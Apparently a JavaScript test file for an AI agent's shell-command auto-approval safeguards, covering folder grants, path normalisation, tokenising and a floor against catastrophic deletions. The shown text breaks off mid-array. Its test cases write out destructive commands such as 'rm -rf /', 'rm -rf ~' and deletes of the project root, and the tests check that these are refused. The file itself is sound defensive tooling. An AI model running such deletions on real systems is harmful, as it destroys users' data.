  // A bare system top-level (`/usr`) is one segment deep — too broad to grant.
  { name: 'du over a bare system top-level → never grant /usr, no du * wildcard, exact only',
    command: 'du -sh /usr',
    expected: [['du -sh /usr']] },
  // The user's whole home dir is too broad to grant (it is "all my files").
  { name: 'du over the home dir itself → never grant ~, no du * wildcard, exact only',
    command: 'du -sh /Users/jules',
    expected: [['du -sh /Users/jules']] },
  // `/Users` is an ancestor of home (contains every user) → too broad to grant.
  { name: 'du over /Users (home ancestor) → never grant /Users, no du * wildcard, exact only',
    command: 'du -sh /Users',
    expected: [['du -sh /Users']] },

  // === Folder grants for paths written relative to the working directory =====
  // A relative path names a real folder once the working directory is known, so
  // the honest remedy is that folder — not the verbatim command text, and never
  // a `grep *` that would drop the path restriction the command just violated.
  { name: 'relative out-of-root path → grant the folder it resolves to, no wildcard',
    command: 'grep -rn X ../../other-repo',
    expected: [{ allowedPaths: ['/Users/jules/other-repo'] }] },
  { name: 'out-of-root path relative to a cd → grant resolves from where it runs',
    command: 'cd web && grep -rn X ../../other-repo',
    expected: [{ allowedPaths: ['/Users/jules/code/other-repo'] }] },
  // awk and git declare their path arguments, so an out-of-root read is
  // recognised as the sole obstacle and the wildcard tiers are withheld.
  { name: 'awk over an out-of-root file → grant the file, no awk * wildcard',
    command: "awk '{print $1}' /opt/sdk/data/report.txt",
    expected: [{ allowedPaths: ['/opt/sdk/data/report.txt'] }] },
  { name: 'git -C an out-of-root repo → grant the repo, no git * wildcard',
    command: 'git -C /Users/jules/other-repo log --oneline',
    expected: [{ allowedPaths: ['/Users/jules/other-repo'] }] },
  { name: 'git pathspec outside the roots → grant the pathspec folder, no git * wildcard',
    command: 'git log -- ../../other-repo/src',
    expected: [{ allowedPaths: ['/Users/jules/other-repo/src'] }] },
  // A git command rejected for a non-path reason keeps its ordinary tiers: the
  // grant probe fails, so nothing pretends a folder would fix it. The
  // `git push *` middle tier drops out on its own — it cannot match a command
  // that starts `git -C …`, and every tier must survive the dry-run.
  { name: 'git write subcommand with an out-of-root -C → still the ordinary tiers',
    command: 'git -C /Users/jules/other-repo push origin main',
    expected: [['git -C /Users/jules/other-repo push origin main'], ['git *']] },

  // === A leading `cd` out of the roots is a path obstacle like any other =====
  // Granting the folder it moves to is the whole fix: the segments after it are
  // judged standing in that folder, so a command that only reads where it landed
  // needs nothing else. No glob tier can appear here — the analyser refuses an
  // escaping `cd` before it ever consults the pattern list, so a `cd *` (or even
  // the exact command text) could not honestly approve it.
  { name: 'leading cd out of roots (&&) → grant the folder, no glob tier',
    command: 'cd /Users/jules/other-repo && ls',
    expected: [{ allowedPaths: ['/Users/jules/other-repo'] }] },
  { name: 'leading cd out of roots (;) → grant the folder',
    command: 'cd /Users/jules/other-repo; ls',
    expected: [{ allowedPaths: ['/Users/jules/other-repo'] }] },
  // The reported shape: cd into a sibling project's conversation dir, then read
  // around inside it. Everything after the cd is relative to where it landed.
  { name: 'leading cd out of roots + relative reads inside it → one folder grant',
    command: 'cd "/Users/jules/other-repo/.juggler/Some Conversation--conv_abc123"; ls; ls txns | tail -5',
    expected: [{ allowedPaths: ['/Users/jules/other-repo/.juggler/Some Conversation--conv_abc123'] }] },
  // A relative escaping cd resolves against the working directory first, so the
  // grant names the folder it actually reaches.
  { name: 'leading relative cd escaping the roots → grant the resolved folder',
    command: 'cd ../other-repo; ls',
    expected: [{ allowedPaths: ['/Users/jules/code/other-repo'] }] },
  // The cd grant unions with the grants its following segments need.
  { name: 'leading cd out of roots + read in a third folder → union both grants',
    command: 'cd /Users/jules/other-repo && cat /opt/sdk/windows/notes.txt',
    expected: [{ allowedPaths: ['/Users/jules/other-repo', '/opt/sdk/windows/notes.txt'] }] },
  // A segment that is unsafe for a NON-path reason is not rescued by the grant,
  // and no glob can cover the escaping cd → nothing honest to suggest.
  { name: 'leading cd out of roots + a destructive segment → no suggestion',
    command: 'cd /Users/jules/other-repo; rm -rf /',
    expected: [] },
  // Targets no folder grant can reach: the refusal stands with nothing to offer.
  { name: 'leading bare cd (→ $HOME) → no suggestion',
    command: 'cd; ls', expected: [] },
  { name: 'leading cd - (→ $OLDPWD) → no suggestion',
    command: 'cd -; ls', expected: [] },
  { name: 'leading cd ~ (home is too broad to grant) → no suggestion',
    command: 'cd ~; ls', expected: [] },
  { name: 'leading cd to a bare system top-level → no suggestion',
    command: 'cd /usr; ls', expected: [] },
  { name: 'leading cd to a path carrying a shell expansion → no suggestion',
    command: 'cd $HOME/x; ls', expected: [] },

  // A `cd` in any OTHER position declares its target as a path argument too, so
  // an out-of-root move offers that folder rather than a `cd *` wildcard — which
  // would auto-approve moving anywhere and drop the containment rule entirely.
  { name: 'non-leading cd out of roots → grant the folder, never cd *',
    command: 'ls; cd /Users/jules/other-repo',
    expected: [{ allowedPaths: ['/Users/jules/other-repo'] }] },
  { name: 'lone cd out of roots → grant the folder, never cd *',
    command: 'cd /Users/jules/other-repo',
    expected: [{ allowedPaths: ['/Users/jules/other-repo'] }] }
];

/**
 * @param {SuggestCase} c
 * @returns {{ ok: boolean, msg: string }} result object; ok is true when the suggestion case passed, msg describes the mismatch otherwise
 */
function runSuggestCase(c) {
  const platform = c.platform || 'darwin';
  const patterns = c.patterns || [];
  const allowedRoots = c.allowedRoots || [PROJECT_ROOT];
  const writeEnabled = c.writeEnabled || false;
  const cwd = c.cwd || PROJECT_ROOT;
  const suggestions = suggestApprovalPatterns(c.command, {
    platform,
    home: TEST_HOME,
    allowedRoots,
    patterns,
    interpreters: TEST_INTERPRETERS,
    writeEnabled,
    cwd
  });
  // A path-grant suggestion serialises as {allowedPaths}; a glob suggestion as
  // its bare patterns array — matching the SuggestCase.expected shape.
  const actual = suggestions.map(s => s.allowedPaths ? { allowedPaths: s.allowedPaths } : s.patterns);
  if (JSON.stringify(actual) !== JSON.stringify(c.expected)) {
    return { ok: false, msg: `suggest "${c.command}": want ${JSON.stringify(c.expected)}, got ${JSON.stringify(actual)}` };
  }
  // Property: every suggestion, once applied (glob patterns added to the
  // enabled set, or folders added to the allowed roots), makes the whole
  // command auto-approve. This is what "minimum needed to pass" means.
  for (const s of suggestions) {
    const mergedPatterns = s.allowedPaths ? patterns : [...patterns, ...s.patterns];
    const mergedRoots = s.allowedPaths ? [...allowedRoots, ...s.allowedPaths] : allowedRoots;
    if (!isCommandAutoApproved(c.command, { platform, home: TEST_HOME, allowedRoots: mergedRoots, patterns: mergedPatterns, writeEnabled, cwd })) {
      return { ok: false, msg: `suggest "${c.command}": suggestion ${JSON.stringify(actual[suggestions.indexOf(s)])} did NOT make the command auto-approve` };
    }
  }
  return { ok: true, msg: '' };
}

/**
 * Run one auto-approval case twice: with the working directory the server runs
 * commands in (the project root, unless the case names another), and with none
 * at all. The second run pins the no-cwd fallback a caller gets when it cannot
 * supply one, where a relative path is judged solely on whether it escapes via
 * `..` — most cases decide the same either way, and the ones that don't say so
 * with `expectedNoCwd`.
 * @param {ApprovalCase} c the case to run
 * @returns {{ ok: boolean, msg: string }} result object; ok is true when the auto-approval case matched its expectation, msg describes the mismatch otherwise
 */
function runCase(c) {
  const opts = {
    platform: c.platform || 'darwin',
    home: TEST_HOME,
    allowedRoots: c.allowedRoots || [PROJECT_ROOT],
    patterns: c.patterns,
    writeEnabled: c.writeEnabled || false
  };
  const where = `for "${c.command}" with patterns=${JSON.stringify(c.patterns)} platform=${c.platform || 'darwin'}`;

  const withCwd = isCommandAutoApproved(c.command, { ...opts, cwd: c.cwd || PROJECT_ROOT });
  if (withCwd !== c.expected) {
    return { ok: false, msg: `expected ${c.expected} ${where}, got ${withCwd}` };
  }

  const wantNoCwd = c.expectedNoCwd === undefined ? c.expected : c.expectedNoCwd;
  const noCwd = isCommandAutoApproved(c.command, opts);
  if (noCwd !== wantNoCwd) {
    return { ok: false, msg: `expected ${wantNoCwd} with no cwd ${where}, got ${noCwd}` };
  }
  return { ok: true, msg: '' };
}

/**
 * @returns {Promise<{passed: number, failed: number, errors: string[]}>} aggregated test results (counts of passing/failing cases plus a list of error messages)
 */
export async function runTests() {
  let passed = 0;
  let failed = 0;
  /** @type {string[]} */
  const errors = [];

  for (const c of CASES) {
    try {
      const { ok, msg } = runCase(c);
      if (ok) passed++;
      else { failed++; errors.push(`command-approval/${c.name}: ${msg}`); }
    } catch (e) {
      failed++;
      errors.push(`command-approval/${c.name}: threw ${e instanceof Error ? e.message : String(e)}`);
    }
  }

  // === suggestApprovalPatterns ===
  for (const c of SUGGEST_CASES) {
    try {
      const { ok, msg } = runSuggestCase(c);
      if (ok) passed++;
      else { failed++; errors.push(`suggest/${c.name}: ${msg}`); }
    } catch (e) {
      failed++;
      errors.push(`suggest/${c.name}: threw ${e instanceof Error ? e.message : String(e)}`);
    }
  }

  // === posixNormalize spot-checks ===
  /** @type {Array<[string,string]>} */
  const NORM_CASES = [
    ['/a/b/c', '/a/b/c'],
    ['/a/b/../c', '/a/c'],
    ['./a/b', 'a/b'],
    ['a/../b', 'b'],
    ['../a', '../a'],
    ['../../a', '../../a'],
    ['', '.'],
    ['/', '/']
  ];
  for (const [input, want] of NORM_CASES) {
    const got = posixNormalize(input);
    if (got !== want) { failed++; errors.push(`posixNormalize("${input}"): want "${want}", got "${got}"`); }
    else passed++;
  }

  // === isGrantableRoot spot-checks (sanity gate for folder grants) ===
  /** @type {Array<[string,boolean]>} */
  const GRANT_CASES = [
    ['/', false],                              // whole filesystem
    ['/usr', false],                           // bare system top-level
    ['/etc', false],
    ['/Users', false],                         // ancestor of home (all users)
    ['/Users/jules', false],                   // the home dir itself
    ['/Users/jules/code', true],               // a folder inside home
    ['/Users/jules/code/juggler/web', true],   // deeper still
    ['/opt/sdk/windows', true],                // unrelated deep absolute path
    ['/Users/jules2', true],                   // a different user's home (depth 2, not ours)
    ['relative/path', false],                  // not absolute
    ['', false]
  ];
  for (const [root, want] of GRANT_CASES) {
    const got = isGrantableRoot(root, TEST_HOME);
    if (got !== want) { failed++; errors.push(`isGrantableRoot("${root}"): want ${want}, got ${got}`); }
    else passed++;
  }

  // === Windows path-format normalisation spot-checks ===
  // Every spelling of the same Windows location must compare equal, and a path
  // outside the roots must stay outside regardless of spelling. `platform`
  // gates the drive reinterpretation so POSIX behaviour is unchanged (on POSIX,
  // `/c/...` is a real path and comparison stays case-sensitive).
  /** @type {Array<[string, string[], string, boolean]>} p, roots, platform, expected-inside */
  const WIN_PATH_CASES = [
    // git-bash /c/ command path vs the three root spellings — all the same place
    ['/c/Users/jules/code/juggler/web', ['C:\\Users\\jules\\code\\juggler'], 'windows', true],
    ['/c/Users/jules/code/juggler/web', ['C:/Users/jules/code/juggler'], 'windows', true],
    ['/c/Users/jules/code/juggler/web', ['/c/Users/jules/code/juggler'], 'windows', true],
    // forward-slash C:/ command path vs native root
    ['C:/Users/jules/code/juggler/README.md', ['C:\\Users\\jules\\code\\juggler'], 'windows', true],
    // native backslash command path vs native root (both need folding)
    ['C:\\Users\\jules\\code\\juggler\\web', ['C:\\Users\\jules\\code\\juggler'], 'windows', true],
    // /cygdrive/c/ Cygwin spelling
    ['/cygdrive/c/Users/jules/code/juggler/web', ['C:\\Users\\jules\\code\\juggler'], 'windows', true],
    // drive-letter + path case-insensitivity (Windows FS is case-insensitive)
    ['/c/users/JULES/code/juggler/web', ['C:\\Users\\jules\\code\\juggler'], 'windows', true],
    // OUTSIDE the roots — must stay out, every spelling
    ['C:/Windows/System32', ['C:\\Users\\jules\\code\\juggler'], 'windows', false],
    ['/c/Windows/System32', ['C:\\Users\\jules\\code\\juggler'], 'windows', false],
    // a different drive is never inside a C: root
    ['/d/Users/jules/code/juggler/web', ['C:\\Users\\jules\\code\\juggler'], 'windows', false],
    // POSIX guard: `/c/` is a literal path, no drive reinterpretation, and
    // comparison stays case-sensitive.
    ['/c/Users/x/file', ['/c/Users/x'], 'linux', true],
    ['/C/Users/x/file', ['/c/Users/x'], 'linux', false],
    ['C:/Windows/System32', ['/c/Users'], 'linux', true], // relative-path branch off-Windows (unchanged legacy behaviour)
  ];
  for (const [p, roots, platform, want] of WIN_PATH_CASES) {
    const got = isPathInsideAllowedRoots(p, roots, '', platform);
    if (got !== want) { failed++; errors.push(`isPathInsideAllowedRoots("${p}", ${JSON.stringify(roots)}, "${platform}"): want ${want}, got ${got}`); }
    else passed++;
  }

  // === matchesGlob spot-checks ===
  /** @type {Array<[string,string,boolean]>} */
  const GLOB_CASES = [
    ['*', 'anything goes', true],
    ['git *', 'git log', true],
    ['git *', 'git log | tail', true], // no newline in command
    ['git *', 'gitlog', false],
    ['echo hello', 'echo hello', true],
    ['echo hello', 'echo hellox', false],
    ['a.b*', 'a.bcd', true],
    ['a.b*', 'aXbcd', false] // `.` is escaped, not regex any-char
  ];
  for (const [pat, cmd, want] of GLOB_CASES) {
    const got = matchesGlob(pat, cmd);
    if (got !== want) { failed++; errors.push(`matchesGlob("${pat}", "${cmd}"): want ${want}, got ${got}`); }
    else passed++;
  }

  // === tokenize bails ===
  /** @type {string[]} */
  // `cat <<EOF` (no body), an unterminated heredoc (delimiter never appears),
  // and the `<<<` here-string all bail; a *terminated* heredoc does not (its
  // shape is asserted in TOKEN_SHAPES below).
  // Note: unquoted `$x` / `${x}` / `$((1+2))` no longer bail — they tokenize as
  // literal word text marked `unquotedVar` (asserted in TOKEN_SHAPES /
  // UNQUOTED_VAR_FLAGS below). Backticks and `$(…)` command substitution still
  // do not appear here as bails: `$(…)` is captured (SUBST_CAPTURES), backticks
  // bail.
  const TOKEN_BAILS = ['echo `x`', "echo '", 'echo "', 'cat <<EOF', 'cat <<EOF\nbody', 'cat <<<word', 'f=`x`'];
  for (const t of TOKEN_BAILS) {
    if (tokenize(t) !== null) {
      failed++;
      errors.push(`tokenize: expected null for "${t}"`);
    } else passed++;
  }

  // === tokenize: an unquoted newline becomes a `;` separator op ===
  // `echo a\nb` → word(echo) word(a) op(;) word(b); a backslash-newline is a
  // line continuation that joins the two lines (`ls \\\nweb` → word(ls) word(web)).
  /** @type {Array<[string, Array<['word'|'op', string]>]>} */
  const TOKEN_SHAPES = [
    ['echo a\nb', [['word', 'echo'], ['word', 'a'], ['op', ';'], ['word', 'b']]],
    ['echo hi &&\necho bye', [['word', 'echo'], ['word', 'hi'], ['op', '&&'], ['word', 'echo'], ['word', 'bye']]],
    ['ls \\\nweb', [['word', 'ls'], ['word', 'web']]],
    // A terminated heredoc is stripped as an inert input redirect: only the
    // command words survive, the body is consumed up to the closing delimiter.
    ['cat <<EOF\nbody\nEOF', [['word', 'cat']]],
    // Parsing resumes after the delimiter line — a trailing newline becomes a
    // `;` separator and the following command is tokenised normally.
    ['cat <<EOF\nbody\nEOF\nls', [['word', 'cat'], ['op', ';'], ['word', 'ls']]],
    // Quoted delimiter; body containing shell metacharacters is never parsed.
    ["python3 - <<'PY'\nprint(1)\nPY", [['word', 'python3'], ['word', '-']]],
    // `<<-` strips leading tabs from body lines and the closing delimiter.
    ['cat <<-EOF\n\tbody\n\tEOF', [['word', 'cat']]],
    // A heredoc can co-occur with a pipeline on the same line; the body still
    // begins at the next line.
    ['cat <<EOF | wc -l\nbody\nEOF', [['word', 'cat'], ['op', '|'], ['word', 'wc'], ['word', '-l']]],
    // Unquoted expansions are kept as literal word text (no longer a bail): the
    // `$NAME` / `${NAME}` / `$((expr))` text survives verbatim for pattern
    // matching (which is unaffected by runtime word-splitting).
    ['echo $x', [['word', 'echo'], ['word', '$x']]],
    ['echo ${x}', [['word', 'echo'], ['word', '${x}']]],
    ['echo $((1+2)) end', [['word', 'echo'], ['word', '$((1+2))'], ['word', 'end']]],
    ['gh api r/$n', [['word', 'gh'], ['word', 'api'], ['word', 'r/$n']]]
  ];
  for (const [cmd, want] of TOKEN_SHAPES) {
    const toks = tokenize(cmd);
    const got = toks && toks.map(t => [t.type, t.text]);
    if (JSON.stringify(got) !== JSON.stringify(want)) {
      failed++;
      errors.push(`tokenize shape: "${cmd}" want ${JSON.stringify(want)}, got ${JSON.stringify(got)}`);
    } else passed++;
  }

  // === tokenize marks UNQUOTED expansions (word-split-capable) but not quoted
  // ones (opaque single word) ===
  /** @type {Array<[string, number, boolean]>} command, word-token index, expected unquotedVar */
  const UNQUOTED_VAR_FLAGS = [
    ['echo $x', 1, true],
    ['echo ${x}', 1, true],
    ['echo $((1+2))', 1, true],
    ['gh api r/$n', 2, true],
    ['echo "$x"', 1, false],          // double-quoted → not word-split-capable
    ['echo \\$x', 1, false],          // escaped literal dollar → not an expansion
    ['echo $', 1, false]              // bare trailing dollar → literal, not an expansion
  ];
  for (const [cmd, idx, want] of UNQUOTED_VAR_FLAGS) {
    const toks = tokenize(cmd);
    const tok = toks && toks[idx];
    const got = Boolean(tok && tok.type === 'word' && tok.unquotedVar);
    if (got !== want) {
      failed++;
      errors.push(`tokenize unquotedVar: "${cmd}" token[${idx}] want ${want}, got ${got}`);
    } else passed++;
  }

  // === tokenize captures `$(…)` command substitution (no longer bails) ===
  // Bare and double-quoted forms capture the inner command on the word's
  // `subst` field; backticks still bail (asserted above). Bare variable
  // expansions no longer bail — they tokenize as marked literal text
  // (TOKEN_SHAPES / UNQUOTED_VAR_FLAGS above).
  /** @type {Array<[string, number, string[]]>} command, word-token index, expected subst */
  const SUBST_CAPTURES = [
    ['f=$(grep -rln foo cmd/)', 0, ['grep -rln foo cmd/']],
    ['sed -n "/x/p" "$(echo y)"', 3, ['echo y']],
    ['echo "pre-$(whoami)-post"', 1, ['whoami']]
  ];
  for (const [cmd, idx, wantSubst] of SUBST_CAPTURES) {
    const toks = tokenize(cmd);
    const got = toks && toks[idx] && toks[idx].type === 'word' ? toks[idx].subst : undefined;
    if (JSON.stringify(got) !== JSON.stringify(wantSubst)) {
      failed++;
      errors.push(`tokenize subst: "${cmd}" token[${idx}].subst want ${JSON.stringify(wantSubst)}, got ${JSON.stringify(got)}`);
    } else passed++;
  }

  // === reviseApprovalSuggestion (editable suggested approval patterns) ===
  //
  // Drives the plugin hook directly through a real ExecuteContextItem instance
  // backed by stub session/messageThread, so validation is exactly what the
  // original suggestion buttons guaranteed — the edit just substitutes the
  // user's text before the dry-run.
  {
    /**
     * Build an ExecuteContextItem whose messageThread/session are minimal stubs.
     * @param {{allowedPaths?: string[], patterns?: string[]}} [state]
     * @returns {ExecuteContextItem} A probe item wired to the stub context
     */
    const makeItem = (state = {}) => {
      const session = { platform: 'darwin', home: TEST_HOME };
      const mt = {
        getAllowedPaths: () => state.allowedPaths || [],
        getRulesFor: (/** @type {string} */ key) => key === 'execute'
          ? (state.patterns || []).map(v => ({ kind: 'glob', value: v, scope: 'conversation' }))
          : []
      };
      return new ExecuteContextItem({
        id: 'revise-probe',
        session,
        conversation: { session },
        messageThread: mt
      });
    };

    /**
     * @param {{name: string, ok: boolean, msg?: string}} r
     */
    const record = (r) => {
      if (r.ok) passed++;
      else { failed++; errors.push(`revise/${r.name}: ${r.msg || 'failed'}`); }
    };

    // -- Command-glob edits (original carries `rules`) --------------------------
    const globOriginal = { rules: [{ kind: 'glob', value: 'git push *', scope: 'conversation' }], patterns: ['git push *'] };

    try {
      // Narrowing to an exact command that still matches stays valid.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: globOriginal, editedText: 'git push origin main',
        params: { command: 'git push origin main' }
      });
      record({ name: 'glob narrow stays valid', ok: res.valid === true && !!res.rules
        && res.rules[0].value === 'git push origin main' && res.patterns[0] === 'git push origin main'
        && !res.notice, msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'glob narrow stays valid', ok: false, msg: String(e) }); }

    try {
      // Narrowing so far it no longer matches the command → invalid, no-match notice.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: globOriginal, editedText: 'git pull *',
        params: { command: 'git push origin main' }
      });
      record({ name: 'glob over-narrow rejected', ok: res.valid === false && /wouldn't approve/.test(res.notice || ''),
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'glob over-narrow rejected', ok: false, msg: String(e) }); }

    try {
      // Empty text → invalid.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: globOriginal, editedText: '   ',
        params: { command: 'git push origin main' }
      });
      record({ name: 'glob empty rejected', ok: res.valid === false, msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'glob empty rejected', ok: false, msg: String(e) }); }

    try {
      // Over-length text → invalid.
      const item = makeItem();
      const long = 'echo ' + 'a'.repeat(200);
      const res = item.reviseApprovalSuggestion({
        index: 0, original: globOriginal, editedText: long,
        params: { command: 'git push origin main' }
      });
      record({ name: 'glob over-length rejected', ok: res.valid === false && /too long/i.test(res.notice || ''),
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'glob over-length rejected', ok: false, msg: String(e) }); }

    try {
      // Widening to a bare `*` is valid but flagged broad (amber caution).
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: globOriginal, editedText: '*',
        params: { command: 'git push origin main' }
      });
      record({ name: 'glob widen-to-star broad', ok: res.valid === true && /broad/i.test(res.notice || ''),
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'glob widen-to-star broad', ok: false, msg: String(e) }); }

    try {
      // An interpreter wildcard (`bash *`) is broad; must warn even though the
      // command matches. Use a bash command so the dry-run approves.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: globOriginal, editedText: 'bash *',
        params: { command: 'bash deploy.sh' }
      });
      record({ name: 'glob interpreter wildcard broad', ok: res.valid === true && /broad/i.test(res.notice || ''),
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'glob interpreter wildcard broad', ok: false, msg: String(e) }); }

    // -- Folder-grant edits (original carries `allowedPaths`) -------------------
    // A read-only command reaching outside the roots; granting the folder covers it.
    const grantOriginal = { allowedPaths: ['/Users/jules/notes'], patterns: ['~/notes'] };
    const grantCommand = 'cat ~/notes/todo.md';

    try {
      // Editing to a deeper folder that still contains the target stays valid.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: grantOriginal, editedText: '~/notes/sub',
        params: { command: 'cat ~/notes/sub/todo.md' }
      });
      record({ name: 'grant deeper stays valid', ok: res.valid === true && !!res.allowedPaths
        && res.allowedPaths[0] === '/Users/jules/notes/sub' && res.patterns[0] === '~/notes/sub',
      msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'grant deeper stays valid', ok: false, msg: String(e) }); }

    try {
      // A sibling folder that does NOT contain the target → invalid, no-cover notice.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: grantOriginal, editedText: '~/other',
        params: { command: grantCommand }
      });
      record({ name: 'grant sibling rejected', ok: res.valid === false && /wouldn't cover/.test(res.notice || ''),
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'grant sibling rejected', ok: false, msg: String(e) }); }

    try {
      // Tilde round-trips: editing to an absolute path returns the tilde display.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: grantOriginal, editedText: '/Users/jules/notes',
        params: { command: grantCommand }
      });
      record({ name: 'grant tilde round-trip', ok: res.valid === true && res.patterns[0] === '~/notes',
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'grant tilde round-trip', ok: false, msg: String(e) }); }

    try {
      // Granting the home dir itself is not grantable → invalid.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: grantOriginal, editedText: '~',
        params: { command: grantCommand }
      });
      record({ name: 'grant home rejected', ok: res.valid === false && /grantable|valid folder/i.test(res.notice || ''),
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'grant home rejected', ok: false, msg: String(e) }); }

    try {
      // A non-absolute, non-tilde path is not a valid folder.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: grantOriginal, editedText: 'relative/dir',
        params: { command: grantCommand }
      });
      record({ name: 'grant relative rejected', ok: res.valid === false, msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'grant relative rejected', ok: false, msg: String(e) }); }

    try {
      // A direct child of home (`~/code`) that covers the command is valid but
      // flagged broad.
      const item = makeItem();
      const res = item.reviseApprovalSuggestion({
        index: 0, original: grantOriginal, editedText: '~/code',
        params: { command: 'cat ~/code/notes.md' }
      });
      record({ name: 'grant home-child broad', ok: res.valid === true && /broad/i.test(res.notice || ''),
        msg: JSON.stringify(res) });
    } catch (e) { record({ name: 'grant home-child broad', ok: false, msg: String(e) }); }

    try {
      // Shape routing: the SAME editedText routes to glob logic for a `rules`
      // original and folder logic for an `allowedPaths` original.
      const item = makeItem();
      const asGlob = item.reviseApprovalSuggestion({
        index: 0, original: globOriginal, editedText: '/Users/jules/notes',
        params: { command: grantCommand }
      });
      const asGrant = item.reviseApprovalSuggestion({
        index: 0, original: grantOriginal, editedText: '/Users/jules/notes',
        params: { command: grantCommand }
      });
      record({ name: 'shape routes by original', ok: !!asGlob.rules && !asGlob.allowedPaths
        && !!asGrant.allowedPaths && !asGrant.rules, msg: `${JSON.stringify(asGlob)} | ${JSON.stringify(asGrant)}` });
    } catch (e) { record({ name: 'shape routes by original', ok: false, msg: String(e) }); }
  }

  // === isCatastrophicDeletion (auto-approve blast-radius floor) ===
  // The deterministic floor that keeps the probabilistic reviewer from silently
  // approving a recursive/forced delete of the project root, an ancestor, home,
  // or a filesystem root. It is NOT a general destructive classifier — a delete
  // of a genuine subdir / scratch tree stays false and flows through the reviewer.
  const CATASTROPHIC_ROOT = '/home/crem/tmp/juggler';
  const CATASTROPHIC_HOME = '/home/crem';
  /** @type {Array<{name: string, command: string, expected: boolean, cwd?: string}>} */
  const CATASTROPHIC_CASES = [
    // -- Positive: recursive/forced delete of a catastrophic radius ------------
    { name: 'exact project root, trailing slash (the incident)', command: 'rm -fr /home/crem/tmp/juggler/', expected: true },
    { name: 'exact project root, -rf', command: 'rm -rf /home/crem/tmp/juggler', expected: true },
    { name: '`rm -rf .` at project root', command: 'rm -rf .', expected: true },
    { name: '`rm -rf ./` at project root', command: 'rm -rf ./', expected: true },
    { name: 'home via tilde', command: 'rm -rf ~', expected: true },
    { name: 'home via $HOME', command: 'rm -rf $HOME', expected: true },
    { name: 'home via ${HOME}', command: 'rm -rf ${HOME}', expected: true },
    { name: 'filesystem root', command: 'rm -rf /', expected: true },
    { name: 'bare top-level', command: 'rm -rf /usr', expected: true },
    { name: 'ancestor of project root', command: 'rm -rf /home/crem/tmp', expected: true },
    { name: 'home dir directly', command: 'rm -rf /home/crem', expected: true },
    { name: 'chained after a benign command', command: 'echo hi && rm -rf /home/crem/tmp/juggler', expected: true },
    { name: 'long-form --recursive --force on root', command: 'rm --recursive --force /home/crem/tmp/juggler', expected: true },
    { name: 'force-only (-f) on project root still flagged', command: 'rm -f /home/crem/tmp/juggler', expected: true },
    { name: 'combined -fr order', command: 'rm -fr /home/crem/tmp/juggler', expected: true },
    { name: 'target after -- separator', command: 'rm -rf -- /home/crem/tmp/juggler', expected: true },
    { name: 'multiple targets, one catastrophic', command: 'rm -rf build /home/crem/tmp/juggler', expected: true },
    { name: 'cd out to an ancestor then delete cwd', command: 'cd /home/crem/tmp && rm -rf .', expected: true },
    // -- Negative: genuine subdir / scratch / no-flag — reviewer's job ---------
    { name: 'relative build dir', command: 'rm -rf ./build', expected: false },
    { name: 'node_modules', command: 'rm -rf node_modules', expected: false },
    { name: 'absolute subdir of project', command: 'rm -rf /home/crem/tmp/juggler/sub', expected: false },
    { name: 'relative subdir of project', command: 'rm -rf sub/dir', expected: false },
    { name: 'single file, no recursive/force flag', command: 'rm foo.txt', expected: false },
    { name: 'not a delete at all', command: 'ls', expected: false },
    { name: 'unexpanded glob is out of floor scope (reviewer decides)', command: 'rm -rf *', expected: false },
    { name: 'unresolved variable target left to reviewer', command: 'rm -rf $BUILD_DIR', expected: false },
    { name: 'in-project cd then delete a subdir', command: 'cd sub && rm -rf .', expected: false },
    { name: 'a different user home is not ours', command: 'rm -rf /home/other', expected: false },
  ];
  for (const c of CATASTROPHIC_CASES) {
    try {
      const got = isCatastrophicDeletion(c.command, {
        platform: 'linux', home: CATASTROPHIC_HOME, projectRoot: CATASTROPHIC_ROOT, cwd: c.cwd
      });
      if (got !== c.expected) {
        failed++;
        errors.push(`catastrophic/${c.name}: want ${c.expected} for "${c.command}", got ${got}`);
      } else passed++;
    } catch (e) {
      failed++;
      errors.push(`catastrophic/${c.name}: threw ${e instanceof Error ? e.message : String(e)}`);
    }
  }
  // -- Windows: one tree, every spelling ------------------------------------
  // The project path reaches the browser (and the model) OS-native, so that is
  // the spelling a delete of it arrives in — and a POSIX shell eats those
  // backslashes, leaving the analyser a word that names nowhere. Every spelling
  // of the same directory has to measure the same radius: native, forward-slash
  // drive, and MSYS.
  const WIN_ROOT = 'D:\\a\\juggler\\juggler';
  const WIN_HOME = 'C:\\Users\\runneradmin';
  /** @type {Array<{name: string, command: string, expected: boolean, cwd?: string, root?: string}>} */
  const WINDOWS_CATASTROPHIC_CASES = [
    { name: 'native project root, backslashes eaten by the shell', command: `rm -rf ${WIN_ROOT}`, expected: true },
    { name: 'native project root, quoted', command: `rm -rf "${WIN_ROOT}"`, expected: true },
    { name: 'forward-slash drive spelling of the project root', command: 'rm -rf D:/a/juggler/juggler', expected: true },
    { name: 'MSYS spelling of the project root', command: 'rm -rf /d/a/juggler/juggler', expected: true },
    { name: 'native ancestor of the project root', command: 'rm -rf D:\\a\\juggler', expected: true },
    { name: 'native home dir', command: `rm -rf ${WIN_HOME}`, expected: true },
    { name: 'MSYS home dir', command: 'rm -rf /c/users/runneradmin', expected: true },
    { name: 'home via tilde with a native home', command: 'rm -rf ~', expected: true },
    { name: 'home via $HOME with a native home', command: 'rm -rf $HOME', expected: true },
    { name: 'whole drive', command: "rm -rf 'D:\\'", expected: true },
